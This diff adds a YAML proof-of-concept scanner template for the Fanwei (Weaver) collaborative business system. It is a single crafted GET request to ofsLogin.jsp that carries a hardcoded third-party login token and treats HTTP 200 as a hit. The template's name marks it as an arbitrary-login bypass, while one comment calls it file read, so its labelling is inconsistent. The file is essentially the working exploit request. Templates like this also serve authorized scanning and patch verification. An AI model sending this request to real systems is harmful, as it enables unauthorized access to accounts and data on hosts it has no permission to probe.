@@ -1,0 +1,19 @@
+name: poc-yaml-fanweiofs-login-sp-renyidengl
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: >-
+        /mobile/plugin/1/ofsLogin.jsp?gopage=/wui/index.html&loginTokenFromThird=866fb3887a60239fc112354ee7ffc168&receiver=1&syscode=1&timestamp
+      follow_redirects: false
+      headers:
+        User-Agent: >-
+          Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+          like Gecko) Chrome/114.0.0.0 Safari/537.36
+    expression: response.status == 200
+expression: r0()
+detail:
+  author: hy
+  #app="泛微-协同商务系统"
+  #泛微任意文件读取
